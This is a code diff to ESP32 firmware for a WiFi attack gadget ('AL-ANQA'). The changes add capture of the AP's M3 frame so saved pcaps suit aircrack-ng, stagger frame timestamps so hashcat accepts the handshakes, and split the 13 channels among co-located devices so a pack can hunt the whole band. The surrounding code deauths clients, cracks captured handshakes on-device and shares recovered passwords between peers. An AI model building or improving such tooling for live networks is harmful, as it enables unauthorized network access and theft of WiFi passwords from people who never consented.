@@ -72,6 +72,7 @@ static const uint8_t PWN_CHANS[]   = {1, 6, 11};
 #define PWN_RSSI_CUTOFF    (-80)
 #define PWN_RING           24
 #define PWN_FRAME_MAX      256
+#define PWN_M3_GRACE_MS    250     // after M2, wait this long for the AP's M3 (aircrack M2+M3 pair) before flushing
 
 enum PwnMode { PWN_ACTIVE, PWN_STEALTH, PWN_PASSIVE };
 
@@ -132,7 +133,8 @@ struct PwnCapBuf {
     uint8_t  bssid[6];
     char     ssid[33];
     uint8_t  m1[PWN_FRAME_MAX]; uint16_t m1Len; bool haveM1;
-    uint8_t  m2[PWN_FRAME_MAX]; uint16_t m2Len; bool haveM2;
+    uint8_t  m2[PWN_FRAME_MAX]; uint16_t m2Len; bool haveM2; uint32_t m2Ms;   // m2Ms = when M2 landed (M3 grace timer)
+    uint8_t  m3[PWN_FRAME_MAX]; uint16_t m3Len; bool haveM3;   // AP's M3 — kept for aircrack (M2+M3 pair), passive/deauth path only
     bool     m1HasPmkid;
 };
 static PwnCapBuf s_cap;
@@ -496,6 +498,7 @@ static const uint8_t PWN_GRID_PREFIX[3] = {0xA2, 0x9A, 0x0A};   // "an AL-ANQA p
 #define PWN_PEER_TTL_MS  30000
 #define PWN_GRID_SWEEP_HI  13        // advert is swept over channels 1..this so a peer on ANY channel hears it
 #define PWN_GRID_TX_GAP_MS 3         // ms between per-channel advert TX (let each frame leave before hopping)
+#define PWN_GRID_STABLE_MS 6000      // a peer must be heard this long (~2 grid ticks) before it joins the channel-split cell — churn debounce (§12f.1)
 
 struct __attribute__((packed)) GridAdv {
     char     magic[4];   // "ANQG"
@@ -514,7 +517,9 @@ struct __attribute__((packed)) GridCred {
     char     psk[64];
     uint8_t  bssid[6];
 };
-struct GridPeer { char name[13]; uint16_t pwned, hs; int8_t rssi; uint32_t lastSeenMs; };
+struct GridPeer { char name[13]; uint8_t mac[6]; uint16_t pwned, hs; int8_t rssi; uint32_t lastSeenMs, firstSeenMs; };
+// mac = the peer's grid MAC (frame SA) — the stable identity the channel-split cell
+// sorts by (§12f). firstSeenMs feeds the PWN_GRID_STABLE_MS churn debounce.
 static GridPeer s_peer[PWN_MAX_PEERS];
 static int      s_nPeer = 0;
 static uint8_t  s_gridMac[6];
@@ -608,17 +613,66 @@ static void gridSendCred(const char* ssid, const char* psk, const uint8_t* bssid
         }
     esp_wifi_set_channel(roamCh, WIFI_SECOND_CHAN_NONE);
 }
-static bool gridPeerUpdate(const char* name, uint16_t pwned, uint16_t hs, int8_t rssi) {
+static bool gridPeerUpdate(const char* name, const uint8_t* mac, uint16_t pwned, uint16_t hs, int8_t rssi) {
+    uint32_t now = millis();
+    // Dedup by grid MAC (the full 6-byte identity), NOT by name: the name is only
+    // ANQA-<mac4><mac5>, so two decks sharing those 2 bytes would collide on name and
+    // flip the stored MAC between them every advert — destabilising the MAC-sorted
+    // channel-split. The MAC is the stable identity the partition sorts by (§12f).
     for (int i = 0; i < s_nPeer; i++)
-        if (strncmp(s_peer[i].name, name, 12) == 0) {
+        if (memcmp(s_peer[i].mac, mac, 6) == 0) {
+            strncpy(s_peer[i].name, name, 12); s_peer[i].name[12] = 0;   // keep display label current
             s_peer[i].pwned = pwned; s_peer[i].hs = hs; s_peer[i].rssi = rssi;
-            s_peer[i].lastSeenMs = millis(); return false;    // known peer
+            s_peer[i].lastSeenMs = now; return false;          // known peer
         }
     if (s_nPeer >= PWN_MAX_PEERS) return false;
     strncpy(s_peer[s_nPeer].name, name, 12); s_peer[s_nPeer].name[12] = 0;
+    memcpy(s_peer[s_nPeer].mac, mac, 6);
     s_peer[s_nPeer].pwned = pwned; s_peer[s_nPeer].hs = hs; s_peer[s_nPeer].rssi = rssi;
-    s_peer[s_nPeer].lastSeenMs = millis(); s_nPeer++;
+    s_peer[s_nPeer].lastSeenMs = now; s_peer[s_nPeer].firstSeenMs = now; s_nPeer++;
     return true;                                              // newly met
+}
+
+// ── pwn-grid v2: cooperative CHANNEL-SPLIT (the "cell" model, §12f) ────────────
+// Multiple co-located AL-ANQA pets divide the 13 WiFi channels between them so the
+// pack covers the whole band in parallel. Every deck runs THIS identical function on
+// the identical MAC-sorted roster it hears → the same partition, ZERO negotiation
+// (no extra wire field). Fills set[]/*setN with the channels THIS deck should roam:
+// its assigned lane when in a cell, else the mode's normal set (full-13 or 1/6/11).
+// Updates s_cell* for the HUD. Rules: stealth never splits (it broadcasts nothing, so
+// peers can't see it — it runs its own full set, RX-only); a peer joins the cell only
+// after PWN_GRID_STABLE_MS (churn debounce); a cell caps at PWN_MAX_PEERS (8) members,
+// the 9th+ deck falls back to solo. Lane = { c in 1..13 : (c-1) mod N == rank }.
+static int  s_cellRank = 0, s_cellN = 1;
+static bool s_celled   = false;
+static void gridChanSet(PwnMode mode, bool fullChans, uint8_t* set, int* setN) {
+    uint32_t now = millis();
+    uint8_t macs[PWN_MAX_PEERS + 1][6]; int n = 0;
+    memcpy(macs[n++], s_gridMac, 6);                           // self is always in its own cell
+    if (mode != PWN_STEALTH)
+        for (int i = 0; i < s_nPeer && n <= PWN_MAX_PEERS; i++)
+            if (now - s_peer[i].firstSeenMs >= PWN_GRID_STABLE_MS)
+                memcpy(macs[n++], s_peer[i].mac, 6);
+    // Solo: no stable peers (n==1), or overflow (a cell would exceed 8) → run the mode's
+    // normal channel set. Harmless redundancy, no worse than a lone deck (§12f).
+    if (n <= 1 || n > PWN_MAX_PEERS) {
+        s_celled = false; s_cellN = 1; s_cellRank = 0;
+        if (fullChans) { *setN = 13; for (int i = 0; i < 13; i++) set[i] = (uint8_t)(i + 1); }
+        else           { *setN = (int)sizeof(PWN_CHANS); for (int i = 0; i < *setN; i++) set[i] = PWN_CHANS[i]; }
+        return;
+    }
+    // sort the cell's MACs ascending (insertion sort, n<=8) → same order on every deck
+    for (int i = 1; i < n; i++) {
+        uint8_t key[6]; memcpy(key, macs[i], 6); int j = i - 1;
+        while (j >= 0 && memcmp(macs[j], key, 6) > 0) { memcpy(macs[j + 1], macs[j], 6); j--; }
+        memcpy(macs[j + 1], key, 6);
+    }
+    int rank = 0;
+    for (int i = 0; i < n; i++) if (memcmp(macs[i], s_gridMac, 6) == 0) { rank = i; break; }
+    int nl = 0;
+    for (int c = 1; c <= 13; c++) if ((c - 1) % n == rank) set[nl++] = (uint8_t)c;
+    *setN = nl;
+    s_celled = true; s_cellN = n; s_cellRank = rank;
 }
 
 // ── cardless single-HS RAM crack + cred persistence (§B/§C) ───────────────────
@@ -724,7 +778,7 @@ static void flushCapture(int8_t rssi, uint8_t ch) {
                 if (t2) t2->captured = true;
             }
         }
-        s_cap.active = false; s_cap.haveM1 = s_cap.haveM2 = s_cap.m1HasPmkid = false;
+        s_cap.active = false; s_cap.haveM1 = s_cap.haveM2 = s_cap.haveM3 = s_cap.m1HasPmkid = false;
         return;
     }
 
@@ -734,9 +788,15 @@ static void flushCapture(int8_t rssi, uint8_t ch) {
       if (f) {
           pcap::writeGlobalHeader(f);
           uint8_t bcn[80]; uint16_t bl = buildBeacon(s_cap.bssid, s_cap.ssid, bcn);
-          pcap::writeRecord(f, bcn, bl, millis());
-          pcap::writeRecord(f, s_cap.m1, s_cap.m1Len, millis());
-          if (isHs) pcap::writeRecord(f, s_cap.m2, s_cap.m2Len, millis());
+          // Stagger the synthetic frame timestamps (beacon<M1<M2) so hcxpcapngtool /
+          // hashcat can compute a non-zero EAPOL time gap and pair M1+M2 — a single
+          // shared millis() made a 0-µs gap that these tools reject (karma/wpa3down
+          // pattern). The writer's monotonic guard also enforces this as a backstop.
+          uint32_t t = millis();
+          pcap::writeRecord(f, bcn, bl, t > 30 ? t - 30 : 0);
+          pcap::writeRecord(f, s_cap.m1, s_cap.m1Len, t > 20 ? t - 20 : 0);
+          if (isHs) pcap::writeRecord(f, s_cap.m2, s_cap.m2Len, t > 10 ? t - 10 : 0);
+          if (isHs && s_cap.haveM3) pcap::writeRecord(f, s_cap.m3, s_cap.m3Len, t);
           f.close();
           strncpy(s_lastSaveFile, path, sizeof(s_lastSaveFile) - 1);
           s_lastSaveOk = true;
@@ -755,7 +815,7 @@ static void flushCapture(int8_t rssi, uint8_t ch) {
     }
     PwnTarget* t = targFind(s_cap.bssid);
     if (t) t->captured = true;
-    s_cap.active = false; s_cap.haveM1 = s_cap.haveM2 = s_cap.m1HasPmkid = false;
+    s_cap.active = false; s_cap.haveM1 = s_cap.haveM2 = s_cap.haveM3 = s_cap.m1HasPmkid = false;
 }
 
 // drain one frame from the ring; returns event char for the ticker ('B','1','2',0)
@@ -784,7 +844,7 @@ static char drainOne(uint8_t curCh) {
             if (fr.len < PWN_GRID_ADV_OFF + (int)sizeof(GridAdv)) return 0;
             GridAdv a; memcpy(&a, pl, sizeof(a));
             char nm[13]; strncpy(nm, a.name, 12); nm[12] = 0;
-            bool isNew = gridPeerUpdate(nm, a.pwned, a.hs, fr.rssi);
+            bool isNew = gridPeerUpdate(nm, fr.data + 10, a.pwned, a.hs, fr.rssi);   // SA = peer grid MAC
             if (isNew) { strncpy(s_metName, nm, sizeof(s_metName) - 1); s_metName[12] = 0; return 'G'; }
             return 0;
         }
@@ -854,7 +914,17 @@ static char drainOne(uint8_t curCh) {
     } else if (ev.msg == 2) {
         if (s_cap.active && memcmp(s_cap.bssid, b, 6) == 0) {
             memcpy(s_cap.m2, fr.data, fr.len); s_cap.m2Len = fr.len; s_cap.haveM2 = true;
+            s_cap.m2Ms = millis();                    // start the short M3 grace window
             return '2';
+        }
+    } else if (ev.msg == 3) {
+        // Real-client handshake only: the AP's M3 (from-DS). Stored so the saved cap
+        // carries an M2+M3 pair that aircrack-ng accepts (hashcat needs only M1+M2).
+        // No crypto extraction — pairing only. Never present on the clientless/PMKID path.
+        if (s_cap.active && s_cap.haveM2 && !s_cap.haveM3 &&
+            memcmp(s_cap.bssid, b, 6) == 0 && fr.len <= (uint16_t)PWN_FRAME_MAX) {
+            memcpy(s_cap.m3, fr.data, fr.len); s_cap.m3Len = fr.len; s_cap.haveM3 = true;
+            return '3';
         }
     }
     return 0;
@@ -1024,17 +1094,17 @@ static const char* modeName(PwnMode m);   // defined in the UI section below
 // inspectable offline for tuning the reward weights / γ / C. Append-only, session
 // header separates runs. Written with promiscuous paused (GDMA rule). Disabled = no cost.
 static void aiDbgSession(PwnMode mode, bool fullChans) {
-    if (!s_aiDebug) return;
+    if (!s_aiDebug || !s_haveSd) return;   // no SD → skip the debug write (and its promiscuous pause)
     ScopedPromiscPause _;
     File f = SD.open(PWN_F_AIDBG, FILE_APPEND);
     if (!f) return;
     f.printf("\n=== pwn ai session @%lu  mode=%s chans=%s  gamma=%.2f floor=%.2f scout=%.2f  reward: cap+10 M1+3 newSTA+2 newAP+1 present+%.2f/ap(cap%d)  select=weighted ===\n",
              (unsigned long)millis(), modeName(mode), fullChans ? "1-13" : "1/6/11", PWN_LEARN_GAMMA, PWN_LEARN_FLOOR, PWN_SCOUT_FLOOR, PWN_PRESENCE_W, PWN_PRESENCE_CAP);
-    f.printf("cols: leave c<ch> rew=<this dwell> mean/cnt=<post-update> | per-channel [m<mean> p<pick prob %%>], * = picked | dwell\n");
+    f.printf("cols: leave c<ch> rew=<this dwell> mean/cnt=<post-update> | per-channel [m<mean> p<pick prob %%>], * = picked | dwell dD dB sol txf m1 solM1 m2 ap cli  g=<grid peers>  cell<R/N>[lane] or solo (§12f channel-split)\n");
     f.close();
 }
 static void aiDbgHop(uint32_t ms, uint8_t leftCh, float reward, uint8_t picked, uint32_t dwell, bool fullChans) {
-    if (!s_aiDebug) return;
+    if (!s_aiDebug || !s_haveSd) return;   // no SD → skip the debug write (and its promiscuous pause)
     uint8_t set[13]; int n;
     if (fullChans) { n = 13; for (int i = 0; i < 13; i++) set[i] = i + 1; }
     else           { n = (int)sizeof(PWN_CHANS); for (int i = 0; i < n; i++) set[i] = PWN_CHANS[i]; }
@@ -1056,10 +1126,19 @@ static void aiDbgHop(uint32_t ms, uint8_t leftCh, float reward, uint8_t picked, 
     //   dD>0 & txf>0        → the driver is REJECTING frames → real TX bug (softAP/channel).
     //   dD>0 & txf=0 & m1=0 → directed deauth queued fine but no reconnect handshake → the
     //        frame isn't landing on the victim's channel (softAP-vs-hop mismatch) or PMF.
-    f.printf(" => c%-2u dwell=%lums  dD=%lu dB=%lu sol=%lu txf=%lu m1=%lu solM1=%lu m2=%lu ap=%d cli=%d\n",
+    // grid channel-split status (§12f): g=<peers heard>, then this deck's cell rank/size
+    // + its assigned lane, or "solo". Lets a log-only analysis confirm the split formed.
+    char cellStr[28];
+    if (s_celled) {
+        int off = snprintf(cellStr, sizeof(cellStr), "cell%d/%d[", s_cellRank + 1, s_cellN);
+        for (int c = 1; c <= 13 && off > 0 && off < (int)sizeof(cellStr) - 4; c++)
+            if ((c - 1) % s_cellN == s_cellRank) off += snprintf(cellStr + off, sizeof(cellStr) - off, "%d,", c);
+        if (off > 0 && off < (int)sizeof(cellStr) - 1) snprintf(cellStr + off, sizeof(cellStr) - off, "]");
+    } else strcpy(cellStr, "solo");
+    f.printf(" => c%-2u dwell=%lums  dD=%lu dB=%lu sol=%lu txf=%lu m1=%lu solM1=%lu m2=%lu ap=%d cli=%d g=%d %s\n",
              picked, (unsigned long)dwell, (unsigned long)s_dtxD, (unsigned long)s_dtxB,
              (unsigned long)s_solTx, (unsigned long)s_txFail, (unsigned long)s_m1Seen,
-             (unsigned long)s_solM1, (unsigned long)s_m2Seen, s_nTarg, s_nCli);
+             (unsigned long)s_solM1, (unsigned long)s_m2Seen, s_nTarg, s_nCli, s_nPeer, cellStr);
     f.close();
 }
 
@@ -1068,7 +1147,7 @@ static void aiDbgHop(uint32_t ms, uint8_t leftCh, float reward, uint8_t picked, 
 // round-robin); what matters is the channel visited + whether the radio ACCEPTED it
 // (`set=OK` vs an error — the direct proof that ch 12/13 tune in pwn's APSTA mode).
 static void basicDbgSession(PwnMode mode, bool fullChans) {
-    if (!s_aiDebug) return;
+    if (!s_aiDebug || !s_haveSd) return;   // no SD → skip the debug write (and its promiscuous pause)
     ScopedPromiscPause _;
     File f = SD.open(PWN_F_BASICDBG, FILE_APPEND);
     if (!f) return;
@@ -1078,7 +1157,7 @@ static void basicDbgSession(PwnMode mode, bool fullChans) {
     f.close();
 }
 static void basicDbgHop(uint32_t ms, uint8_t ch, esp_err_t setRc, uint32_t dwell) {
-    if (!s_aiDebug) return;
+    if (!s_aiDebug || !s_haveSd) return;   // no SD → skip the debug write (and its promiscuous pause)
     ScopedPromiscPause _;
     File f = SD.open(PWN_F_BASICDBG, FILE_APPEND);
     if (!f) return;
@@ -1202,6 +1281,7 @@ static bool argHas(const char* a, const char* w) { return a && strstr(a, w); }
 static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
     DisplayManager& dm = displayManager;
     s_nTarg = 0; s_nCli = 0; s_nPeer = 0; s_metName[0] = 0;
+    s_celled = false; s_cellN = 1; s_cellRank = 0;   // start solo until stable peers appear (§12f)
     memset(&s_cap, 0, sizeof(s_cap)); s_priorityDone.clear(); s_sessionCaps.clear(); s_crackSkip.clear();
     s_dtxD = s_dtxB = s_txFail = s_m1Seen = s_m2Seen = s_solTx = s_solM1 = 0;   // reset per-session diag counters
     s_rHead = s_rTail = 0;
@@ -1234,8 +1314,8 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
     gridInitIdentity();   // grid MAC + name (needs WiFi started for esp_wifi_get_mac)
     DeauthAttack da(displayManager, wifiFunctions);   // proven deauth primitive (rule 5b)
 
-    int nChans = fullChans ? 13 : (int)(sizeof(PWN_CHANS));
-    int ci = 0;
+    int ci = 0;   // round-robin cursor into the effective channel set (gridChanSet)
+    int cellSig = 0;    // last-seen cell signature (rank/size); 0 = solo → no startup toast, only real cell changes toast
     uint8_t curCh = fullChans ? 1 : PWN_CHANS[0];
     uint32_t apCount = 0, hsCount = 0, pmCount = 0, pwnedCount = 0;
     char ticker[40] = "roaming...";
@@ -1249,7 +1329,7 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
     float curReward = 0;                // reward accrued on the CURRENT channel this dwell
     int   apBase = 0, cliBase = 0;      // AP/client counts at dwell start (for new-discovery reward)
     bool running = true;
-    char toast[28] = {0};
+    char toast[40] = {0};   // widened for the "cell R/N ch <list>" split toast (§12f)
     uint32_t t0Session = millis();
 
     // layout + double-buffered phoenix box
@@ -1281,9 +1361,14 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
     while (running) {
         uint32_t now = millis();
 
-        // Do NOT hop while a handshake is mid-flight (M1 seen, waiting for M2) — stay on
-        // channel to catch M2 instead of jumping away and losing it (the main capture bug).
-        bool midCapture = s_cap.active && s_cap.haveM1 && !s_cap.haveM2;
+        // Do NOT hop while a handshake is mid-flight — stay on channel to catch the next
+        // frame instead of jumping away and losing it (the main capture bug). This covers
+        // BOTH waiting for M2 (M1 seen, no M2) and the brief M3 grace after M2 (so the AP's
+        // M3 lands on-channel for the aircrack-friendly M2+M3 pair). PMKID clears via the
+        // completion branch the same iteration, so this never stalls it.
+        bool midCapture = s_cap.active && s_cap.haveM1 &&
+                          (!s_cap.haveM2 ||
+                           (!s_cap.haveM3 && (now - s_cap.m2Ms) <= PWN_M3_GRACE_MS));
 
         // HOT-CHANNEL HOLD: a client is actively handshaking on this channel (recent M1), so
         // stay put and keep kicking it to complete the 4-way instead of wandering off — each
@@ -1295,12 +1380,14 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
         // channel dwell / hop
         if (now >= hopAt && !midCapture && !hotHold) {
             // AI: credit the channel we're LEAVING with what it produced, then let the
-            // bandit choose where to go next (else plain round-robin).
+            // bandit choose where to go next (else plain round-robin). Both paths roam
+            // over the EFFECTIVE channel set — this deck's cell lane when co-located
+            // AL-ANQA peers split the band (§12f), else the mode's normal set. Recomputed
+            // every hop, so join/leave re-partitions automatically; we only ever change
+            // channel here (gated on !midCapture) so a lane switch never drops a capture.
+            uint8_t setArr[13]; int setN; gridChanSet(mode, fullChans, setArr, &setN);
             uint8_t aiLeftCh = curCh; float aiLeftRew = 0;   // captured for the debug trace
             if (s_aiOn) {
-                uint8_t setArr[13]; int setN;
-                if (fullChans) { setN = 13; for (int i = 0; i < 13; i++) setArr[i] = i + 1; }
-                else           { setN = (int)sizeof(PWN_CHANS); for (int i = 0; i < setN; i++) setArr[i] = PWN_CHANS[i]; }
                 curReward += 1.0f * (float)(s_nTarg - apBase) + 2.0f * (float)(s_nCli - cliBase); // new APs/clients
                 // STANDING presence reward: a channel that HOSTS un-captured prey keeps
                 // out-scoring an empty one every visit (not just on first discovery) — this
@@ -1315,8 +1402,9 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
                 learnUpdate(curCh, curReward);
                 curCh = learnPick(setArr, setN);
             } else {
-                curCh = fullChans ? (uint8_t)(ci + 1) : PWN_CHANS[ci];
-                ci = (ci + 1) % nChans;
+                if (ci >= setN) ci = 0;                       // lane may have shrunk on a re-partition
+                curCh = setArr[ci];
+                ci = (ci + 1) % setN;
             }
             curReward = 0; apBase = s_nTarg; cliBase = s_nCli;   // reset dwell accumulators
             esp_err_t chSetRc = esp_wifi_set_channel(curCh, WIFI_SECOND_CHAN_NONE);  // capture: proves 12/13 accepted
@@ -1423,8 +1511,12 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
             else if (now >= learnSaveAt) { learnSave(); learnSaveAt = now + 120000; }
         }
 
-        // complete a capture?
-        if (s_cap.active && s_cap.haveM1 && (s_cap.haveM2 || s_cap.m1HasPmkid)) {
+        // complete a capture? PMKID flushes at once; a real M1+M2 handshake waits a
+        // short grace for the AP's M3 (so the cap holds an aircrack-friendly M2+M3
+        // pair), then flushes with whatever it has if M3 never arrives (still hashcat-
+        // crackable as M1+M2).
+        bool m3done = s_cap.haveM3 || (s_cap.haveM2 && (now - s_cap.m2Ms) > PWN_M3_GRACE_MS);
+        if (s_cap.active && s_cap.haveM1 && (s_cap.m1HasPmkid || (s_cap.haveM2 && m3done))) {
             bool wasHs = s_cap.haveM2;
             PwnTarget* tt = targFind(s_cap.bssid);
             flushCapture(tt ? tt->rssi : 0, tt ? tt->ch : curCh);
@@ -1440,7 +1532,11 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
         // cracking — the "found APs but stuck on IDLE, never cracks" bug.
         // 6s (was 3s): gives the 4-way time to finish M2 when the target channel is
         // revisited sparsely (full-13 roam) — 3s dropped handshakes that 1/6/11 caught.
-        if (s_cap.active && (now - s_cap.startMs) > 6000) s_cap.active = false;
+        // Only abandon a capture with NO crackable material yet — a completed M1+M2
+        // (or PMKID) is always left for the completion branch above, so the M3 grace
+        // window can never let the 6s timeout drop a valid late handshake.
+        if (s_cap.active && !s_cap.haveM2 && !s_cap.m1HasPmkid &&
+            (now - s_cap.startMs) > 6000) s_cap.active = false;
 
         // CRACK ONLY IN FREE TIME (capture is ALWAYS the priority). While there is any
         // un-captured prey in range OR a capture in flight, do NOT crack — hunt. When the
@@ -1568,14 +1664,31 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
             tft.setTextSize(2); tft.setTextColor(mc, TFT_BLACK); tft.setCursor(RX, BOX_Y); tft.print(mood);
             tft.setTextSize(1);
             tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 24);
-            if (s_aiOn) {                              // brain readout: current ch + learned favorite
-                uint8_t setA[13]; int setNn;
-                if (fullChans) { setNn = 13; for (int i = 0; i < 13; i++) setA[i] = i + 1; }
-                else           { setNn = (int)sizeof(PWN_CHANS); for (int i = 0; i < setNn; i++) setA[i] = PWN_CHANS[i]; }
-                uint8_t fav = learnFavorite(setA, setNn);
-                snprintf(l, sizeof(l), "c%-2u AI>c%-2u g%-2d", curCh, fav, s_nPeer);   // g = grid peers
+            // Effective set drives the AI favorite AND refreshes s_cell* for the readout.
+            uint8_t setA[13]; int setNn; gridChanSet(mode, fullChans, setA, &setNn);
+            // Toast when the channel-split partition changes (cell forms / re-partitions /
+            // dissolves) — shows this deck's lane so the split is visible on-device.
+            int sig = s_celled ? (s_cellRank * 100 + s_cellN) : 0;
+            if (sig != cellSig) {
+                cellSig = sig;
+                if (s_celled) {
+                    int off = snprintf(toast, sizeof(toast), "cell %d/%d ch ", s_cellRank + 1, s_cellN);
+                    for (int i = 0; i < setNn && off > 0 && off < (int)sizeof(toast) - 1; i++)
+                        off += snprintf(toast + off, sizeof(toast) - off, "%s%u", i ? "," : "", setA[i]);
+                } else {
+                    snprintf(toast, sizeof(toast), "solo %s", fullChans ? "full-13" : "1/6/11");
+                }
+                toastUntil = now + 2500;
             }
-            else snprintf(l, sizeof(l), "%-7s ch%-2u g%-2d", modeName(mode), curCh, s_nPeer);
+            // In a cell, show this deck's rank/size (R/N) instead of the raw peer count —
+            // R/N is what proves the channel-split partition formed (§12f); solo shows g<N>.
+            if (s_aiOn) {                              // brain readout: current ch + learned favorite
+                uint8_t fav = learnFavorite(setA, setNn);
+                if (s_celled) snprintf(l, sizeof(l), "c%-2u >c%-2u %d/%d", curCh, fav, s_cellRank + 1, s_cellN);
+                else          snprintf(l, sizeof(l), "c%-2u AI>c%-2u g%-2d", curCh, fav, s_nPeer);
+            }
+            else if (s_celled) snprintf(l, sizeof(l), "%-7s c%-2u %d/%d", modeName(mode), curCh, s_cellRank + 1, s_cellN);
+            else               snprintf(l, sizeof(l), "%-7s ch%-2u g%-2d", modeName(mode), curCh, s_nPeer);
             tft.print(l);
             tft.setTextColor(PH_DIM, TFT_BLACK); tft.setCursor(RX, BOX_Y + 40); tft.print("SIGNAL");
             for (int i = 0; i < 4; i++) tft.fillRect(RX + i * 14, BOX_Y + 52, 11, 13, i < bars ? TFT_GREEN : PH_ASHDK);
@@ -1608,7 +1721,7 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
         char k = inputHandler.getKeyboardInput();
         if (k == 'q' || k == 'Q') running = false;
         else if (k == 'm' || k == 'M') { mode = (PwnMode)((mode + 1) % 3); drawChrome(); drawAt = 0; }
-        else if (k == 'c' || k == 'C') { fullChans = !fullChans; nChans = fullChans ? 13 : (int)sizeof(PWN_CHANS); ci = 0;
+        else if (k == 'c' || k == 'C') { fullChans = !fullChans; ci = 0;
                                          snprintf(toast, sizeof(toast), "channels: %s", fullChans ? "1-13" : "1/6/11");
                                          toastUntil = now + 1500; drawAt = 0; }
         else if (k == 'k' || k == 'K') { backlog = !backlog;
